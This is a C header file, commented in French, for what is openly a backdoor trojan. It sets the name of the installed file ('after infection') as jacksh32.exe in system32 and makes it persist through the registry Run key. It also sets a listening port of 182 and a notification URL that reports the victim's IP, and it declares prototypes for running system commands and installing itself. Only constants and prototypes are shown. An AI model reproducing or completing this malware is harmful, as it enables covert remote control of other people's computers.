/*####################################
jacklib.h
contient tous les prototypes de fonctions pour l'entete du programme.
contient les constantes de configuration du serveur...
####################################*/

#ifndef _JACKLIB_H_
    #define _JACKLIB_H_
    
    #include <stdio.h>
    #include <windows.h>
    #include <Wininet.h>
    
    /*--------------------CONSTANTES-DE-CONFIGURATION-DU-SERVEUR------------------*/
    #define SERVER_NAME "jacksh32.exe"              // Nom du serveur après infection
    #define INSTALL_DIR "c:\\windows\\system32\\"   // Chemin du répertoire d'installation
    #define REG_NAME "Jksh32"                       // nom dans la BDR
    #define REG_KEY "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" // Chemin registre
    #define PORT 182                                // Numéro du port d'écoute
    #define NOTIF_URL "http://site.com/notif.php"   //Script de notification d'IP
    #define WAIT 120000                             // attente du serveur (2 min en ms)
    #define ANS_SIZE 10001                          // Taille maxi de la réponse renvoyée
    /*----------------------------------------------------------------------------*/

    #define LG_MAX_REQUETE 128 //taille de la requete envoyée
     
    // prototype des fonctions
    HWND GetConsoleHwnd(void);
    char *systM(char *buffer);
    int fexist(const char *filename);
    void InsertRegRun(char *pszprog);
    int install(char *name);
    int is_connected(void);
    int http_request(char *url);
    char *StringLwr(char *s);
    char *cutstr(char *str);
    
#endif // _JACKLIB_H_
